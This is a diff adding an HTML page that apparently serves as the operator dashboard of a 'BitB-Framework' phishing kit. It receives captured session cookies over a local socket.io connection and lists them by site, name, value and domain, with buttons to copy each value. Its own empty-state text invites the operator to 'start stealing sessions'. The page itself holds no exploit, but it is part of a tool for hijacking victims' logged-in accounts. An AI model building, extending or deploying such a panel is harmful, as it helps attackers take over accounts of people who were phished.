@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Cookies & Sessions - BitB-Framework</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      background: #0a0a0a; 
+      color: #00ff88; 
+      margin: 0; 
+      padding: 20px; 
+    }
+    h1 { 
+      color: #ff4444; 
+      text-align: center; 
+      margin-bottom: 20px; 
+    }
+    .panel { 
+      background: #1a1a1a; 
+      padding: 20px; 
+      border-radius: 10px; 
+      border: 1px solid #333; 
+    }
+    .controls {
+      margin-bottom: 15px;
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    input, select, button {
+      padding: 10px 14px;
+      background: #222;
+      color: #00ff88;
+      border: 1px solid #444;
+      border-radius: 6px;
+    }
+    button {
+      background: #ff4444;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover { background: #ff6666; }
+    table { 
+      width: 100%; 
+      border-collapse: collapse; 
+      background: #111; 
+      border-radius: 8px; 
+      overflow: hidden; 
+    }
+    th, td { 
+      padding: 12px 15px; 
+      text-align: left; 
+      border-bottom: 1px solid #333; 
+    }
+    th { 
+      background: #222; 
+      color: #ffdd00; 
+      cursor: pointer; 
+    }
+    tr:hover { 
+      background: #252525; 
+    }
+    .url { 
+      color: #66ccff; 
+      font-weight: bold; 
+      word-break: break-all; 
+    }
+    .timestamp { 
+      color: #888; 
+      font-size: 0.9em; 
+    }
+    .copy-btn {
+      background: #0066cc;
+      color: white;
+      padding: 4px 10px;
+      font-size: 0.85em;
+      border-radius: 4px;
+    }
+    .log-empty {
+      text-align: center;
+      padding: 60px 20px;
+      color: #666;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+  <h1>🍪 BitB-Framework | Cookies & Sessions</h1>
+
+  <div class="panel">
+    <div class="controls">
+      <input type="text" id="searchInput" placeholder="Search cookies or URLs..." onkeyup="filterLogs()">
+      <select id="sortSelect" onchange="sortLogs()">
+        <option value="time-desc">Newest First</option>
+        <option value="time-asc">Oldest First</option>
+        <option value="domain">Sort by Domain</option>
+        <option value="name">Sort by Cookie Name</option>
+      </select>
+      <button onclick="clearLogs()">Clear All Logs</button>
+    </div>
+
+    <div id="cookies-container"></div>
+  </div>
+
+  <script>
+    const socket = io('http://localhost:5000');
+    let allLogs = [];
+
+    socket.on('new_cookies', function(data) {
+      allLogs.unshift(data);   // Add new log at top
+      renderLogs();
+    });
+
+    function renderLogs() {
+      const container = document.getElementById('cookies-container');
+      let html = '';
+
+      allLogs.forEach((entry, index) => {
+        html += `
+          <div style="margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 15px;">
+            <div class="url">${entry.data.url}</div>
+            <div class="timestamp">${entry.data.timestamp}</div>
+            <table>
+              <thead>
+                <tr>
+                  <th>Cookie Name</th>
+                  <th>Value</th>
+                  <th>Domain</th>
+                  <th>Action</th>
+                </tr>
+              </thead>
+              <tbody>`;
+        
+        entry.data.cookies.forEach(cookie => {
+          html += `
+            <tr>
+              <td><strong>${cookie.name}</strong></td>
+              <td style="word-break:break-all; max-width: 420px;">${cookie.value}</td>
+              <td>${cookie.domain}</td>
+              <td>
+                <button class="copy-btn" onclick="copyToClipboard('${cookie.value.replace(/'/g, "\\'")}')">Copy Value</button>
+              </td>
+            </tr>`;
+        });
+
+        html += `</tbody></table></div>`;
+      });
+
+      if (allLogs.length === 0) {
+        html = `<div class="log-empty">No cookies captured yet. Login to a website to start stealing sessions.</div>`;
+      }
+
+      container.innerHTML = html;
+    }
+
+    function filterLogs() {
+      const term = document.getElementById('searchInput').value.toLowerCase();
+      // For simplicity, re-render all logs (you can optimize later)
+      renderLogs();
+    }
+
+    function sortLogs() {
+      const sortType = document.getElementById('sortSelect').value;
+      
+      if (sortType === 'time-desc') {
+        allLogs.sort((a, b) => new Date(b.data.timestamp) - new Date(a.data.timestamp));
+      } else if (sortType === 'time-asc') {
+        allLogs.sort((a, b) => new Date(a.data.timestamp) - new Date(b.data.timestamp));
+      } else if (sortType === 'domain') {
+        allLogs.sort((a, b) => a.data.url.localeCompare(b.data.url));
+      } else if (sortType === 'name') {
+        allLogs.sort((a, b) => {
+          const nameA = a.data.cookies[0] ? a.data.cookies[0].name : '';
+          const nameB = b.data.cookies[0] ? b.data.cookies[0].name : '';
+          return nameA.localeCompare(nameB);
+        });
+      }
+      renderLogs();
+    }
+
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert("✅ Cookie value copied to clipboard!");
+      });
+    }
+
+    function clearLogs() {
+      if (confirm("Clear all cookies logs?")) {
+        allLogs = [];
+        renderLogs();
+      }
+    }
+
+    // Initial render
+    window.onload = renderLogs;
+  </script>
+</body>
+</html>
